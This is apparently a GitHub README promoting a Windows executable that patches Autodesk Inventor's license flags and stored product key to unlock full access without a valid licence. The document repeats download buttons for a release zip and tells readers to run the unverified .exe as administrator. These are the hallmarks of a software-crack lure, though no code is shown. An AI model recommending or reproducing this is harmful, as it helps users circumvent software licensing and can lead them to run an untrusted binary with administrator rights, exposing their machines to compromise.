<div align="center">
<img src="assets/banner.svg" width="100%" alt="Autodesk Inventor Full Access + Product banner"/>

# 🔧 Inventor Full Access License Editor ⚙️

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge)
![Windows EXE](https://img.shields.io/badge/Windows-EXE-0078d4?style=for-the-badge&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)
![Updated](https://img.shields.io/badge/updated-2026-orange?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-Windows_10%2F11-informational?style=for-the-badge)
![Stars](https://img.shields.io/github/stars/ArialStarstill/inventor-full-access-license-editor?style=for-the-badge)

### ⭐ Star this repo if it helped you!

<p align="center">
  <a href="https://github.com/ArialStarstill/inventor-full-access-license-editor/releases/download/latest/inventor-full-access-license-editor.zip">
    <img src="https://img.shields.io/badge/GET_STARTED-Download-7C3AED?style=for-the-badge&logo=windows&logoColor=white&labelColor=5B21B6" width="550" alt="Download"/>
  </a>
</p>
</div>

---

## Table of Contents

- [About / Overview](#about--overview)
- [Requirements](#requirements)
- [Features](#features)
- [Installation](#installation)
- [FAQ](#faq)
- [Community / Support](#community--support)
- [License](#license)
- [Disclaimer](#disclaimer)
- [Download](#download)

---

## Features

Let's get straight to the point — here's what this tool actually does, no fluff:

- **License Panel Editor** — directly edits the license/access flags Inventor checks on startup, so you stop fighting dropdown restrictions.
- **Full Access Toggle** — flips the module-locked state to full access in a single click instead of digging through config files by hand.
- **Product Key Field Patch** — rewrites the stored product key entry so activation screens stop nagging you.
- **One-Click Backup** — automatically snapshots the original config before touching anything, because nobody wants to reinstall Inventor at 2 AM.
- **Zero Install Footprint** — standalone `.exe`, no installer, no background service, no mystery scheduled task left behind.
- **Fast Scan Mode** — detects your Inventor install path automatically instead of making you browse for it like it's 2004.
- **Clean Revert Option** — restores the backup in one step if something looks off.
- **Lightweight UI** — a small window that does its job and gets out of your way.

---

## About / Overview

Here's the problem: Autodesk Inventor's licensing UI is clunky, the "Full Access" state is buried behind flags nobody documents, and if you've ever had to manage a machine where the license just... won't cooperate, you know the pain. Support tickets, forum threads from 2016, config files with zero comments — a mess.

**Inventor Full Access License Editor** fixes that by giving you a direct, GUI-driven way to inspect and patch the relevant license fields on your own installation, instead of manually hex-editing config blobs or praying a random registry tweak from a forum still works in 2026.

> [!NOTE]
> This tool works on your local Inventor installation files. It does not connect to Autodesk servers, and it doesn't touch anything outside the app's own config scope.

> [!TIP]
> Run the backup step first, every time. It takes two seconds and it's the difference between "oops, reverted" and "guess I'm reinstalling."

---

## Requirements

Before you download, make sure you're actually set up for this:

- Windows 10 or Windows 11 (64-bit)
- Autodesk Inventor installed on the same machine
- Administrator rights (the editor needs write access to app config paths)
- ~50 MB free disk space for the tool and backups

> [!IMPORTANT]
> This is a native Windows `.exe`. There's no Python runtime, no pip install, no build step — you download it, you run it. If a guide tells you to `pip install` anything for this project, that guide is wrong.

---

## Installation

No package managers, no dependency hell, just four steps:

1. **Download** the latest release using the button at the top or bottom of this page.
2. **Extract** the archive to any folder you like (Desktop is fine).
3. **Right-click the `.exe` → Run as administrator**. Inventor's config files live in protected paths, so admin rights are required.
4. **Point the tool at your Inventor install** (auto-detect usually finds it) and apply the patch.

That's it. No restart of Windows required — just relaunch Inventor afterward.

---

## FAQ

**Does this require Python or any dependencies?**
No. It's a self-contained Windows executable. Nothing else to install.

**Will this work on Inventor Professional too?**
Yes, the license/access flags this tool targets are shared across Standard and Professional editions.

**I patched it and Inventor still shows the same restriction — why?**
Fully close Inventor (check Task Manager, not just the window) before patching, then relaunch. A running instance caches the old license state in memory.

> [!TIP]
> If auto-detect can't find your install path, browse to it manually — it's usually under `Program Files\Autodesk\Inventor <year>`.

**Can I undo the patch?**
Yes — use the built-in revert option, which restores the automatic backup created before the first patch.

---

## Community / Support

Got a bug, an edge case, or an idea for a feature? Open an [Issue](../../issues) — that's the fastest way to get it looked at. Pull requests are welcome if you want to contribute fixes or improvements. Discussions and feature requests are also welcome in the Issues tab; just tag them clearly so they don't get lost.

---

## License

Released under the **MIT License**, 2026. Do what you want with it, just don't blame us if it breaks — see the [LICENSE](LICENSE) file for the full legal text.

---

## Disclaimer

> [!WARNING]
> This tool modifies local application configuration files on your own machine. It is provided for personal/local use and educational purposes. You are responsible for complying with your organization's software licensing agreements and Autodesk's terms of service.

> [!CAUTION]
> Always back up your Inventor configuration before applying any patch. The project maintainers are not responsible for data loss, broken installations, or license compliance issues resulting from use of this tool.

---

## Download

<p align="center">
  <a href="https://github.com/ArialStarstill/inventor-full-access-license-editor/releases/download/latest/inventor-full-access-license-editor.zip">
    <img src="https://img.shields.io/badge/GET_STARTED-Download-7C3AED?style=for-the-badge&logo=windows&logoColor=white&labelColor=5B21B6" width="550" alt="Download"/>
  </a>
</p>